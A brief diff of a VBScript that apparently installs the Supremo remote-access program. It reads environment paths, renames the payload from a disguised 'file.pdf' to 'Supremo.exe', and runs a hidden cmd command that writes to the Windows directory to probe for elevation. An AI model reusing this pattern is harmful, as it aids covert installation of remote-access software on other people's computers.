@@ -5,7 +5,8 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 temp = oShell.ExpandEnvironmentStrings( "%TEMP%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
-sfile="file.pdf" 'Supremo.exe
+'sfile="file.pdf" 'Supremo.exe
+sfile="Supremo.exe" 'Supremo.exe
 sver="sysexecuser1"
 With oShell
   .Run "cmd /c echo elevated  > " &windir & "\" & sver, 0, True
